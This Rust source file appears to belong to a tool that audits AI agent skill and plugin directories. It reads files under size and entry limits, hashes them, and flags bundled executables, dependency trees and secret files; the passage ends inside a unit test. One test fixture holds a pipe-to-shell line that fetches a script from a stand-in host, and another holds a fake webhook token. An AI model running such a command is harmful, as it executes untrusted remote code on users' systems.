//! Bounded reading and hashing of skill / plugin directories.
//!
//! An item's content is every regular file below its directory (hidden
//! files included). Symlinks inside an item are followed only when their
//! target stays inside the item. Directories are streamed and every entry
//! (file, directory or other) counts against [`super::MAX_ENTRIES`] per item
//! and [`super::GLOBAL_MAX_ENTRIES`] audit-wide; entered directories count
//! against [`super::MAX_DIRS`]. Reads are capped per file
//! ([`super::SCAN_CAP_BYTES`]) and per item ([`super::MAX_FILES`],
//! [`super::MAX_TOTAL_BYTES`]); files are opened without following a
//! symlink, checked against the earlier `lstat` and charged with the bytes
//! actually read. Hitting a cap, failing to read or a file changing during
//! the read marks the item incomplete, never silently skipped.

use std::collections::HashSet;
use std::ffi::{OsStr, OsString};
use std::io::Read;
use std::path::{Path, PathBuf};

use serde::{Deserialize, Serialize};

use super::{
    GLOBAL_MAX_ENTRIES, GLOBAL_MAX_FILES, GLOBAL_MAX_TOTAL_BYTES, MAX_DIRS, MAX_ENTRIES, MAX_FILES,
    MAX_LINE_CHARS, MAX_TOTAL_BYTES, PathDisplay, RawFinding, SCAN_CAP_BYTES, SECRET_EXCERPT,
    decode_rel, is_secret_bearing, keyed_hex, os_display, sha256_hex,
};
use crate::audit::schema::Severity;

/// Directory nesting inside one item that is still read.
const MAX_TREE_DEPTH: usize = 16;

/// Audit-wide read budget.
#[derive(Debug, Clone)]
pub struct Budget {
    pub files: usize,
    pub bytes: u64,
    pub entries: usize,
    max_files: usize,
    max_bytes: u64,
    max_entries: usize,
    item_max_files: usize,
    item_max_bytes: u64,
    pub(super) item_max_entries: usize,
    pub(super) item_max_dirs: usize,
    exhausted: bool,
}

impl Default for Budget {
    fn default() -> Self {
        Self {
            files: 0,
            bytes: 0,
            entries: 0,
            max_files: GLOBAL_MAX_FILES,
            max_bytes: GLOBAL_MAX_TOTAL_BYTES,
            max_entries: GLOBAL_MAX_ENTRIES,
            item_max_files: MAX_FILES,
            item_max_bytes: MAX_TOTAL_BYTES,
            item_max_entries: MAX_ENTRIES,
            item_max_dirs: MAX_DIRS,
            exhausted: false,
        }
    }
}

impl Budget {
    #[cfg(test)]
    pub(super) fn with_item_limits(files: usize, bytes: u64) -> Self {
        Self {
            item_max_files: files,
            item_max_bytes: bytes,
            ..Self::default()
        }
    }

    #[cfg(test)]
    pub(super) fn with_entry_limits(item_entries: usize, item_dirs: usize, global: usize) -> Self {
        Self {
            item_max_entries: item_entries,
            item_max_dirs: item_dirs,
            max_entries: global,
            ..Self::default()
        }
    }

    pub(super) fn is_exhausted(&self) -> bool {
        self.exhausted
            || self.files >= self.max_files
            || self.bytes >= self.max_bytes
            || self.entries >= self.max_entries
    }

    /// Admit one more file expected to need `expected` bytes; the bytes are
    /// charged separately with what was actually read.
    fn admit_file(&mut self, expected: u64) -> bool {
        if self.exhausted
            || self.files >= self.max_files
            || self.bytes.saturating_add(expected) > self.max_bytes
        {
            self.exhausted = true;
            return false;
        }
        self.files += 1;
        true
    }

    fn charge(&mut self, bytes: u64) {
        self.bytes = self.bytes.saturating_add(bytes);
    }

    /// Count one directory entry audit-wide.
    fn take_entry(&mut self) -> bool {
        if self.exhausted || self.entries >= self.max_entries {
            self.exhausted = true;
            return false;
        }
        self.entries += 1;
        true
    }
}

/// Why a directory listing stopped early.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(super) enum Stop {
    Item,
    Global,
}

/// Names of one directory, sorted.
pub(super) struct Listing {
    pub names: Vec<OsString>,
    pub stop: Option<Stop>,
    /// An entry could not be read.
    pub entry_errors: bool,
}

/// Stream `dir`, charging every entry to `used` (cap `max`) and to the
/// global entry budget. At most `max - *used` names are collected before the
/// listing stops, so sorting is bounded.
pub(super) fn list_dir(
    dir: &Path,
    budget: &mut Budget,
    used: &mut usize,
    max: usize,
) -> std::io::Result<Listing> {
    let rd = std::fs::read_dir(dir)?;
    let mut out = Listing {
        names: Vec::new(),
        stop: None,
        entry_errors: false,
    };
    for entry in rd {
        if *used >= max {
            out.stop = Some(Stop::Item);
            break;
        }
        if !budget.take_entry() {
            out.stop = Some(Stop::Global);
            break;
        }
        *used += 1;
        match entry {
            Ok(e) => out.names.push(e.file_name()),
            Err(_) => out.entry_errors = true,
        }
    }
    out.names.sort();
    Ok(out)
}

/// `(relative_path, file_sha256)`; the per-file list kept by pins.
/// Dependency files use a domain-tagged size/mode metadata hash instead and
/// secret-bearing files a keyed `hmac:` digest. `rel` is the reversible
/// display form of the raw path bytes ([`super::os_display`]).
#[derive(Debug, Clone, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize)]
pub struct FileRecord {
    pub rel: String,
    pub sha256: String,
}

/// A readable text file of an item.
#[derive(Debug, Clone)]
pub struct TextFile {
    pub rel: String,
    pub path: PathBuf,
    pub text: String,
    /// Secret-bearing by name: rules run, excerpts are withheld.
    pub secret: bool,
}

impl TextFile {
    /// Prose the agent reads as instructions (`SKILL.md`, Markdown, text).
    pub fn is_instruction(&self) -> bool {
        let lower = self.rel.to_ascii_lowercase();
        [".md", ".markdown", ".mdx", ".txt"]
            .iter()
            .any(|ext| lower.ends_with(ext))
    }
}

/// Everything read from one item directory.
#[derive(Debug, Clone, Default)]
pub struct DirContent {
    pub files: Vec<FileRecord>,
    pub texts: Vec<TextFile>,
    pub findings: Vec<RawFinding>,
    /// `limit_reached`, `unreadable`, ... with a display path.
    pub incomplete: Vec<String>,
}

/// SHA-256 over the sorted `(raw relative path bytes, file digest)` pairs.
pub fn tree_hash(files: &[FileRecord]) -> String {
    let mut sorted: Vec<(Vec<u8>, &str)> = files
        .iter()
        .map(|f| (decode_rel(&f.rel), f.sha256.as_str()))
        .collect();
    sorted.sort();
    let mut buf = Vec::new();
    for (rel, digest) in sorted {
        buf.extend_from_slice(&rel);
        buf.push(0);
        buf.extend_from_slice(digest.as_bytes());
        buf.push(b'\n');
    }
    format!("sha256:{}", sha256_hex(&buf))
}

pub struct ReadCtx<'a> {
    pub max_file_bytes: u64,
    pub budget: &'a mut Budget,
    pub display: &'a PathDisplay,
}

struct Walk<'c, 'a> {
    ctx: &'c mut ReadCtx<'a>,
    root_canon: PathBuf,
    visited: HashSet<PathBuf>,
    out: DirContent,
    stopped: bool,
    files: usize,
    bytes: u64,
    entries: usize,
    dirs: usize,
    dependency: bool,
    dependency_files: usize,
    dependency_bytes: u64,
}

/// Read every regular file below `root`. With `top_level`, only those
/// entries directly under `root` are read (plugins).
pub fn read_tree(root: &Path, top_level: Option<&[&str]>, ctx: &mut ReadCtx<'_>) -> DirContent {
    if ctx.budget.is_exhausted() {
        ctx.budget.exhausted = true;
        return DirContent {
            incomplete: vec!["global_limit_reached".into()],
            ..Default::default()
        };
    }
    let root_canon = match root.canonicalize() {
        Ok(c) => c,
        Err(_) => {
            let shown = ctx.display.show(root);
            return DirContent {
                incomplete: vec![format!("unreadable:{shown}")],
                ..Default::default()
            };
        }
    };
    let mut walk = Walk {
        ctx,
        root_canon: root_canon.clone(),
        visited: HashSet::from([root_canon.clone()]),
        out: DirContent::default(),
        stopped: false,
        files: 0,
        bytes: 0,
        entries: 0,
        dirs: 0,
        dependency: false,
        dependency_files: 0,
        dependency_bytes: 0,
    };
    walk.dir(&root_canon, "", 0, top_level);
    walk.out.files.sort();
    walk.out
}

impl Walk<'_, '_> {
    fn note(&mut self, reason: &str, path: &Path) {
        let shown = self.ctx.display.show(path);
        self.out.incomplete.push(format!("{reason}:{shown}"));
    }

    fn global_stop(&mut self) {
        self.stopped = true;
        self.out.incomplete.push("global_limit_reached".into());
    }

    fn dir(&mut self, dir: &Path, rel: &str, depth: usize, top_level: Option<&[&str]>) {
        let max = self.ctx.budget.item_max_entries;
        let listing = match list_dir(dir, self.ctx.budget, &mut self.entries, max) {
            Ok(l) => l,
            Err(_) => return self.note("unreadable", dir),
        };
        if listing.entry_errors {
            self.note("unreadable", dir);
        }
        match listing.stop {
            Some(Stop::Item) => {
                self.stopped = true;
                return self.note("limit_reached", dir);
            }
            Some(Stop::Global) => return self.global_stop(),
            None => {}
        }
        for name in listing.names {
            if self.stopped {
                return;
            }
            if let Some(allowed) = top_level
                && !name.to_str().is_some_and(|n| allowed.contains(&n))
            {
                continue;
            }
            let shown = os_display(&name);
            let child_rel = if rel.is_empty() {
                shown
            } else {
                format!("{rel}/{shown}")
            };
            self.entry(&dir.join(&name), &child_rel, depth, &name);
        }
    }

    fn entry(&mut self, path: &Path, rel: &str, depth: usize, name: &OsStr) {
        let Ok(meta) = std::fs::symlink_metadata(path) else {
            return self.note("unreadable", path);
        };
        let (target, meta) = if meta.file_type().is_symlink() {
            match path.canonicalize() {
                Ok(t) if t.starts_with(&self.root_canon) => match std::fs::metadata(&t) {
                    Ok(m) => (t, m),
                    Err(_) => return self.note("unreadable", path),
                },
                Ok(_) => return self.note("symlink_outside_item", path),
                Err(_) => return self.note("unreadable", path),
            }
        } else {
            (path.to_path_buf(), meta)
        };
        if meta.is_dir() {
            let dependency_root = !self.dependency && name.to_str().is_some_and(is_dependency_tree);
            if dependency_root {
                self.dependency = true;
                self.dependency_files = 0;
                self.dependency_bytes = 0;
            }
            if depth + 1 > MAX_TREE_DEPTH {
                self.note("limit_reached", path);
            } else if self.dirs >= self.ctx.budget.item_max_dirs {
                self.stopped = true;
                self.note("limit_reached", path);
            } else {
                let canon = target.canonicalize().unwrap_or_else(|_| target.clone());
                if self.visited.insert(canon) {
                    self.dirs += 1;
                    self.dir(&target, rel, depth + 1, None);
                }
            }
            if dependency_root {
                self.out.findings.push(RawFinding::new(
                    "TC011", Severity::Medium, Some(path), None,
                    &format!("bundled dependency tree {}: {} files, {} bytes; contents not scanned (code the skill may execute)",
                        rel.rsplit('/').next().unwrap_or(rel), self.dependency_files, self.dependency_bytes), ""));
                self.dependency = false;
            }
        } else if meta.is_file() {
            let secret = is_secret_bearing(&name.to_string_lossy())
                || target
                    .file_name()
                    .is_some_and(|n| is_secret_bearing(&n.to_string_lossy()));
            self.file(&target, rel, &meta, secret);
        } else {
            // FIFOs, sockets, devices: never opened.
            self.note("unreadable", path);
        }
    }

    fn file(&mut self, path: &Path, rel: &str, meta: &std::fs::Metadata, secret: bool) {
        let len = meta.len();
        let expected = if self.dependency {
            0
        } else {
            len.min(SCAN_CAP_BYTES)
        };
        if self.ctx.budget.exhausted {
            return self.global_stop();
        }
        if self.files >= self.ctx.budget.item_max_files
            || self.bytes.saturating_add(expected) > self.ctx.budget.item_max_bytes
        {
            self.stopped = true;
            return self.note("limit_reached", path);
        }
        if !self.ctx.budget.admit_file(expected) {
            return self.global_stop();
        }
        self.files += 1;
        if self.dependency {
            self.dependency_files += 1;
            self.dependency_bytes = self.dependency_bytes.saturating_add(len);
            #[cfg(unix)]
            let mode = {
                use std::os::unix::fs::PermissionsExt;
                meta.permissions().mode() & 0o7777
            };
            #[cfg(not(unix))]
            let mode = 0;
            self.out.files.push(FileRecord {
                rel: rel.to_string(),
                sha256: sha256_hex(format!("dependency-metadata:{len}:{mode}").as_bytes()),
            });
            return;
        }
        // Never more than `expected`, which fits both remaining budgets.
        let bytes = match read_verified(path, meta, expected) {
            Ok(b) => b,
            Err(ReadFail::Changed(read)) => {
                self.ctx.budget.charge(read);
                self.bytes = self.bytes.saturating_add(read);
                return self.note("changed_during_read", path);
            }
            Err(ReadFail::Unreadable) => return self.note("unreadable", path),
        };
        let got = bytes.len() as u64;
        self.ctx.budget.charge(got);
        self.bytes = self.bytes.saturating_add(got);
        if len > SCAN_CAP_BYTES {
            // Bytes beyond the cap are neither scanned nor hashed.
            self.note("limit_reached", path);
        }
        self.out.files.push(FileRecord {
            rel: rel.to_string(),
            sha256: if secret {
                format!("hmac:{}", keyed_hex(&bytes))
            } else {
                sha256_hex(&bytes)
            },
        });
        let mut findings = file_findings(path, rel, len, &bytes, meta, self.ctx.max_file_bytes);
        if secret {
            findings.push(RawFinding::new(
                "TC012",
                Severity::Medium,
                Some(path),
                None,
                "secret-bearing file bundled in the item (rules still run; excerpts are withheld)",
                "",
            ));
            for f in &mut findings {
                f.excerpt = SECRET_EXCERPT.to_string();
            }
        }
        self.out.findings.append(&mut findings);
        if !is_binary(rel, &bytes) {
            self.out.texts.push(TextFile {
                rel: rel.to_string(),
                path: path.to_path_buf(),
                text: String::from_utf8_lossy(&bytes).into_owned(),
                secret,
            });
        }
    }
}

/// Why [`read_verified`] gave up.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) enum ReadFail {
    Unreadable,
    /// Identity or size differed from the earlier metadata; bytes read.
    Changed(u64),
}

/// Open without following a final symlink and without blocking on a FIFO.
fn open_nofollow(path: &Path) -> std::io::Result<std::fs::File> {
    let mut opts = std::fs::OpenOptions::new();
    opts.read(true);
    #[cfg(unix)]
    {
        use std::os::unix::fs::OpenOptionsExt;
        opts.custom_flags(libc::O_NOFOLLOW | libc::O_NONBLOCK);
    }
    opts.open(path)
}

fn same_identity(a: &std::fs::Metadata, b: &std::fs::Metadata) -> bool {
    #[cfg(unix)]
    {
        use std::os::unix::fs::MetadataExt;
        a.dev() == b.dev() && a.ino() == b.ino()
    }
    #[cfg(not(unix))]
    {
        let _ = (a, b);
        true
    }
}

/// Read at most `limit` bytes of the regular file `expected` described:
/// the opened descriptor must be the same file (device and inode) with the
/// same size, before and after the read.
pub(crate) fn read_verified(
    path: &Path,
    expected: &std::fs::Metadata,
    limit: u64,
) -> Result<Vec<u8>, ReadFail> {
    let file = match open_nofollow(path) {
        Ok(f) => f,
        #[cfg(unix)]
        Err(e) if e.raw_os_error() == Some(libc::ELOOP) => return Err(ReadFail::Changed(0)),
        Err(_) => return Err(ReadFail::Unreadable),
    };
    let before = file.metadata().map_err(|_| ReadFail::Unreadable)?;
    if !before.is_file() || !same_identity(&before, expected) || before.len() != expected.len() {
        return Err(ReadFail::Changed(0));
    }
    let want = limit.min(expected.len());
    let mut buf = Vec::with_capacity(usize::try_from(want).unwrap_or(0).min(1 << 20));
    (&file)
        .take(want)
        .read_to_end(&mut buf)
        .map_err(|_| ReadFail::Unreadable)?;
    let read = buf.len() as u64;
    match file.metadata() {
        Ok(after) if after.len() == expected.len() && read == want => Ok(buf),
        _ => Err(ReadFail::Changed(read)),
    }
}

/// Open without blocking on a FIFO swapped in after the stat, and read at
/// most `cap` bytes (configs; a final symlink is followed).
pub(crate) fn read_capped_to(path: &Path, cap: u64) -> std::io::Result<Vec<u8>> {
    let mut opts = std::fs::OpenOptions::new();
    opts.read(true);
    #[cfg(unix)]
    {
        use std::os::unix::fs::OpenOptionsExt;
        opts.custom_flags(libc::O_NONBLOCK);
    }
    let file = opts.open(path)?;
    if !file.metadata()?.is_file() {
        return Err(std::io::Error::other("not a regular file"));
    }
    let mut buf = Vec::new();
    file.take(cap).read_to_end(&mut buf)?;
    Ok(buf)
}

fn looks_binary(bytes: &[u8]) -> bool {
    let prefix = &bytes[..bytes.len().min(8192)];
    prefix.contains(&0)
        || std::str::from_utf8(prefix).is_err_and(|e| e.error_len().is_some() || bytes.len() < 8192)
}

fn is_binary(rel: &str, bytes: &[u8]) -> bool {
    let ext = Path::new(rel)
        .extension()
        .and_then(|s| s.to_str())
        .unwrap_or("")
        .to_ascii_lowercase();
    MEDIA_EXTS.contains(&ext.as_str()) || looks_binary(bytes)
}

const MEDIA_EXTS: &[&str] = &[
    "png", "jpg", "jpeg", "gif", "webp", "ico", "svgz", "mp3", "wav", "ogg", "flac", "m4a", "mp4",
    "mov", "webm", "woff", "woff2", "ttf", "otf", "zip", "gz", "tgz", "bz2", "xz", "7z", "pdf",
];

fn is_dependency_tree(name: &str) -> bool {
    [
        ".git",
        "node_modules",
        ".venv",
        "venv",
        "__pycache__",
        "site-packages",
        "dist-packages",
        ".tox",
        ".mypy_cache",
        ".pytest_cache",
    ]
    .contains(&name)
}

const BINARY_EXTS: &[&str] = &[".so", ".dylib", ".dll", ".exe"];

fn magic(bytes: &[u8]) -> Option<&'static str> {
    let head = &bytes[..bytes.len().min(4)];
    match head {
        [0x7f, b'E', b'L', b'F'] => Some("ELF"),
        [0xfe, 0xed, 0xfa, 0xce | 0xcf] | [0xce | 0xcf, 0xfa, 0xed, 0xfe] => Some("Mach-O"),
        [0xca, 0xfe, 0xba, 0xbe] => Some("Mach-O universal"),
        [b'M', b'Z', ..] if looks_binary(bytes) => Some("PE"),
        _ => None,
    }
}

/// Executable-bit files with no recognizable script format.
fn unexplained_exec(rel: &str, bytes: &[u8], meta: &std::fs::Metadata) -> bool {
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let script_ext = Path::new(rel)
            .extension()
            .and_then(|s| s.to_str())
            .is_some_and(|ext| {
                [
                    "sh", "bash", "zsh", "py", "js", "mjs", "cjs", "ts", "rb", "pl", "ps1",
                ]
                .contains(&ext.to_ascii_lowercase().as_str())
            });
        meta.permissions().mode() & 0o111 != 0
            && !script_ext
            && !(bytes.starts_with(b"#!") && !looks_binary(bytes))
    }
    #[cfg(not(unix))]
    {
        let _ = (rel, bytes, meta);
        false
    }
}

/// TC006 (size, long line) and TC010 (bundled executable) for one file.
pub fn file_findings(
    path: &Path,
    rel: &str,
    len: u64,
    bytes: &[u8],
    meta: &std::fs::Metadata,
    max_file_bytes: u64,
) -> Vec<RawFinding> {
    let mut out = Vec::new();
    if !is_binary(rel, bytes) && len > max_file_bytes {
        out.push(RawFinding::new(
            "TC006",
            Severity::Low,
            Some(path),
            None,
            &format!(
                "file is {len} bytes, above --max-file-bytes {max_file_bytes}; scanned up to {SCAN_CAP_BYTES} bytes"
            ),
            "",
        ));
    }
    if !is_binary(rel, bytes)
        && let Some((i, chars)) = String::from_utf8_lossy(bytes)
            .lines()
            .enumerate()
            .map(|(i, l)| (i, l.chars().count()))
            .find(|(_, n)| *n > MAX_LINE_CHARS)
    {
        out.push(RawFinding::new(
            "TC006",
            Severity::Low,
            Some(path),
            Some(i + 1),
            &format!("line of {chars} characters (limit {MAX_LINE_CHARS})"),
            "",
        ));
    }
    let lower = rel.to_ascii_lowercase();
    let why = if let Some(kind) = magic(bytes) {
        Some(format!("{kind} executable bundled"))
    } else if let Some(ext) = BINARY_EXTS.iter().find(|e| lower.ends_with(**e)) {
        Some(format!("native binary extension {ext}"))
    } else if unexplained_exec(rel, bytes, meta) {
        Some("executable-bit file without a recognized script format".to_string())
    } else {
        None
    };
    if let Some(why) = why {
        out.push(RawFinding::new(
            "TC010",
            Severity::Medium,
            Some(path),
            None,
            &why,
            "",
        ));
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    fn ctx_read(root: &Path, max: u64) -> DirContent {
        let display = PathDisplay::new(root);
        let mut budget = Budget::default();
        let mut ctx = ReadCtx {
            max_file_bytes: max,
            budget: &mut budget,
            display: &display,
        };
        read_tree(root, None, &mut ctx)
    }

    fn read_with(root: &Path, budget: &mut Budget) -> DirContent {
        let display = PathDisplay::new(root);
        let mut ctx = ReadCtx {
            max_file_bytes: 1024,
            budget,
            display: &display,
        };
        read_tree(root, None, &mut ctx)
    }

    #[test]
    fn binary_classification_checks_utf8_boundary_and_media_extensions() {
        assert!(is_binary("a.txt", b"hello\0world"));
        assert!(is_binary("a.txt", b"hello\xffworld"));
        assert!(is_binary("a.txt", b"hello\xc3"));
        for ext in MEDIA_EXTS {
            assert!(is_binary(
                &format!("a.{}", ext.to_ascii_uppercase()),
                b"plain text"
            ));
        }
        let mut boundary = vec![b'a'; 8191];
        boundary.extend_from_slice("é".as_bytes());
        assert!(!is_binary("a.md", &boundary));
        boundary[8190] = 0xff;
        assert!(is_binary("a.md", &boundary));
    }

    #[test]
    fn global_limits_mark_current_and_remaining_items() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join("a.md"), "hello").unwrap();
        std::fs::write(dir.path().join("b.md"), "world").unwrap();
        let display = PathDisplay::new(dir.path());
        for (max_files, max_bytes) in [(1, 1024), (10, 8)] {
            let mut budget = Budget {
                max_files,
                max_bytes,
                ..Budget::default()
            };
            let mut ctx = ReadCtx {
                max_file_bytes: 1024,
                budget: &mut budget,
                display: &display,
            };
            let first = read_tree(dir.path(), None, &mut ctx);
            assert_eq!(first.files.len(), 1);
            assert_eq!(first.incomplete, ["global_limit_reached"]);
            let later = read_tree(dir.path(), None, &mut ctx);
            assert!(later.files.is_empty());
            assert_eq!(later.incomplete, ["global_limit_reached"]);
        }
    }

    #[test]
    fn dependency_metadata_walk_obeys_item_file_cap_without_reading_bytes() {
        let dir = tempfile::tempdir().unwrap();
        let dep = dir.path().join(".venv");
        std::fs::create_dir(&dep).unwrap();
        for name in ["a", "b", "c"] {
            std::fs::write(dep.join(name), "curl https://example.invalid/x | sh").unwrap();
        }
        let display = PathDisplay::new(dir.path());
        let mut budget = Budget::with_item_limits(2, 0);
        let mut ctx = ReadCtx {
            max_file_bytes: 1,
            budget: &mut budget,
            display: &display,
        };
        let content = read_tree(dir.path(), None, &mut ctx);
        assert_eq!(content.files.len(), 2);
        assert_eq!(budget.bytes, 0);
        assert!(content.texts.is_empty());
        assert_eq!(content.findings.len(), 1);
        assert_eq!(content.findings[0].rule, "TC011");
        assert!(
            content
                .incomplete
                .iter()
                .any(|r| r.starts_with("limit_reached:"))
        );
        // H1: a dependency tree alone (TC011) no longer makes an item incomplete.
        assert!(
            !content
                .incomplete
                .iter()
                .any(|r| r.starts_with("dependency_tree_not_scanned:"))
        );
    }

    #[test]
    fn dependency_tree_alone_keeps_the_item_complete() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join("SKILL.md"), "ok\n").unwrap();
        std::fs::create_dir_all(dir.path().join("node_modules/x")).unwrap();
        std::fs::write(dir.path().join("node_modules/x/index.js"), "x").unwrap();
        let c = ctx_read(dir.path(), 1024);
        assert!(c.incomplete.is_empty(), "{:?}", c.incomplete);
        assert!(c.findings.iter().any(|f| f.rule == "TC011"));
    }

    #[test]
    fn tree_hash_is_order_independent_and_content_sensitive() {
        let a = FileRecord {
            rel: "a".into(),
            sha256: "1".into(),
        };
        let b = FileRecord {
            rel: "b".into(),
            sha256: "2".into(),
        };
        assert_eq!(
            tree_hash(&[a.clone(), b.clone()]),
            tree_hash(&[b.clone(), a.clone()])
        );
        let c = FileRecord {
            rel: "b".into(),
            sha256: "3".into(),
        };
        assert_ne!(tree_hash(&[a.clone(), b]), tree_hash(&[a, c]));
    }

    #[test]
    fn hidden_files_are_content_and_elf_is_flagged() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join("SKILL.md"), "hello\n").unwrap();
        std::fs::write(dir.path().join(".hidden"), "x").unwrap();
        std::fs::write(dir.path().join("tool"), b"\x7fELF\x02\x01\x01\0\0\0").unwrap();
        let c = ctx_read(dir.path(), 1024);
        let rels: Vec<&str> = c.files.iter().map(|f| f.rel.as_str()).collect();
        assert_eq!(rels, [".hidden", "SKILL.md", "tool"]);
        assert!(c.findings.iter().any(|f| f.rule == "TC010"));
        assert!(c.incomplete.is_empty());
    }

    #[test]
    fn plain_text_is_not_tc010_or_tc006() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join("SKILL.md"), "# fine\n").unwrap();
        let c = ctx_read(dir.path(), 1024);
        assert!(c.findings.is_empty(), "{:?}", c.findings);
    }

    #[cfg(unix)]
    #[test]
    fn unexplained_exec_bit_is_tc010() {
        use std::os::unix::fs::PermissionsExt;
        let dir = tempfile::tempdir().unwrap();
        std::fs::create_dir(dir.path().join("scripts")).unwrap();
        for p in ["run.sh", "scripts/unknown"] {
            let f = dir.path().join(p);
            std::fs::write(&f, "echo hi\n").unwrap();
            std::fs::set_permissions(&f, std::fs::Permissions::from_mode(0o755)).unwrap();
        }
        let c = ctx_read(dir.path(), 1024);
        let flagged: Vec<_> = c
            .findings
            .iter()
            .filter(|f| f.rule == "TC010")
            .map(|f| f.file.clone().unwrap())
            .collect();
        assert_eq!(flagged.len(), 1);
        assert!(flagged[0].ends_with("scripts/unknown"));
    }

    #[cfg(unix)]
    #[test]
    fn executable_scripts_anywhere_are_not_tc010() {
        use std::os::unix::fs::PermissionsExt;
        let dir = tempfile::tempdir().unwrap();
        for rel in [
            "skills/continuous-learning/evaluate-session.sh",
            "agents/start-observer.sh",
            "skills/strategic-compact/suggest-compact.sh",
            "agents/no-extension",
            "agents/extension-only.py",
        ] {
            let path = dir.path().join(rel);
            std::fs::create_dir_all(path.parent().unwrap()).unwrap();
            std::fs::write(
                &path,
                if rel.ends_with(".py") {
                    "print('hi')\n"
                } else {
                    "#!/bin/sh\necho hi\n"
                },
            )
            .unwrap();
            std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o755)).unwrap();
        }
        let c = ctx_read(dir.path(), 1024);
        assert!(!c.findings.iter().any(|f| f.rule == "TC010"));
    }

    #[test]
    fn long_line_and_large_file_are_tc006() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join("big.md"), "a".repeat(MAX_LINE_CHARS + 5)).unwrap();
        let c = ctx_read(dir.path(), 100);
        let tc006: Vec<_> = c.findings.iter().filter(|f| f.rule == "TC006").collect();
        assert_eq!(tc006.len(), 2, "size and line length");
        assert!(tc006.iter().all(|f| f.severity == Severity::Low));
        assert!(
            c.incomplete.is_empty(),
            "under the 8 MiB cap stays complete"
        );
    }

    #[cfg(unix)]
    #[test]
    fn symlink_out_of_item_is_not_followed() {
        let outside = tempfile::tempdir().unwrap();
        std::fs::write(outside.path().join("secret"), "x").unwrap();
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join("SKILL.md"), "x").unwrap();
        std::os::unix::fs::symlink(outside.path().join("secret"), dir.path().join("link")).unwrap();
        let c = ctx_read(dir.path(), 1024);
        assert_eq!(c.files.len(), 1);
        assert!(c.incomplete[0].starts_with("symlink_outside_item:"));
    }

    // H3: every entry counts, empty directories included.
    #[test]
    fn many_empty_directories_hit_the_entry_cap() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join("SKILL.md"), "x").unwrap();
        for i in 0..40 {
            std::fs::create_dir(dir.path().join(format!("empty{i:02}"))).unwrap();
        }
        let mut budget = Budget::with_entry_limits(25, 1000, GLOBAL_MAX_ENTRIES);
        let c = read_with(dir.path(), &mut budget);
        assert!(
            c.incomplete.iter().any(|r| r.starts_with("limit_reached:")),
            "{:?}",
            c.incomplete
        );
        assert!(budget.entries <= 25, "{}", budget.entries);
        // The same tree under the default caps is complete.
        let c = ctx_read(dir.path(), 1024);
        assert!(c.incomplete.is_empty(), "{:?}", c.incomplete);
    }

    #[test]
    fn nested_empty_directories_hit_the_directory_cap() {
        let dir = tempfile::tempdir().unwrap();
        for i in 0..10 {
            std::fs::create_dir_all(dir.path().join(format!("d{i}/inner"))).unwrap();
        }
        let mut budget = Budget::with_entry_limits(1000, 5, GLOBAL_MAX_ENTRIES);
        let c = read_with(dir.path(), &mut budget);
        assert!(
            c.incomplete.iter().any(|r| r.starts_with("limit_reached:")),
            "{:?}",
            c.incomplete
        );
    }

    #[test]
    fn global_entry_cap_marks_current_and_later_items() {
        let dir = tempfile::tempdir().unwrap();
        for i in 0..10 {
            std::fs::create_dir(dir.path().join(format!("e{i}"))).unwrap();
        }
        let mut budget = Budget::with_entry_limits(1000, 1000, 5);
        let first = read_with(dir.path(), &mut budget);
        assert_eq!(first.incomplete, ["global_limit_reached"]);
        let later = read_with(dir.path(), &mut budget);
        assert_eq!(later.incomplete, ["global_limit_reached"]);
    }

    // M7: identity and size are checked on the opened descriptor.
    #[test]
    fn read_verified_detects_size_changes_and_charges_actual_bytes() {
        let dir = tempfile::tempdir().unwrap();
        let p = dir.path().join("a.md");
        std::fs::write(&p, "hello").unwrap();
        let meta = std::fs::symlink_metadata(&p).unwrap();
        assert_eq!(read_verified(&p, &meta, 1024).unwrap(), b"hello");
        assert_eq!(read_verified(&p, &meta, 3).unwrap(), b"hel");
        std::fs::write(&p, "hello, longer").unwrap();
        assert_eq!(read_verified(&p, &meta, 1024), Err(ReadFail::Changed(0)));

        std::fs::write(&p, "abc").unwrap();
        let mut budget = Budget::default();
        let c = read_with(dir.path(), &mut budget);
        assert!(c.incomplete.is_empty());
        assert_eq!(budget.bytes, 3);
    }

    #[cfg(unix)]
    #[test]
    fn read_verified_detects_identity_swaps_and_symlinks() {
        let dir = tempfile::tempdir().unwrap();
        let p = dir.path().join("a.md");
        std::fs::write(&p, "hello").unwrap();
        let meta = std::fs::symlink_metadata(&p).unwrap();
        // Keep the old inode alive so it cannot be reused.
        std::fs::rename(&p, dir.path().join("old.md")).unwrap();
        std::fs::write(&p, "HELLO").unwrap();
        assert_eq!(read_verified(&p, &meta, 1024), Err(ReadFail::Changed(0)));
        std::fs::remove_file(&p).unwrap();
        std::os::unix::fs::symlink(dir.path().join("old.md"), &p).unwrap();
        assert_eq!(read_verified(&p, &meta, 1024), Err(ReadFail::Changed(0)));
    }

    // H2 / M8: secret-bearing files are scanned, excerpts withheld, hash keyed.
    #[test]
    fn secret_bearing_files_get_tc012_withheld_excerpts_and_keyed_hash() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join("SKILL.md"), "ok\n").unwrap();
        std::fs::write(
            dir.path().join(".env"),
            "HOOK=https://discord.com/api/webhooks/1/zqxTokenValue987\n",
        )
        .unwrap();
        let c = ctx_read(dir.path(), 1024);
        let env = c.files.iter().find(|f| f.rel == ".env").unwrap();
        assert!(env.sha256.starts_with("hmac:"), "{}", env.sha256);
        let skill = c.files.iter().find(|f| f.rel == "SKILL.md").unwrap();
        assert_eq!(skill.sha256, sha256_hex(b"ok\n"));
        let tc012: Vec<_> = c.findings.iter().filter(|f| f.rule == "TC012").collect();
        assert_eq!(tc012.len(), 1);
        assert_eq!(tc012[0].excerpt, SECRET_EXCERPT);
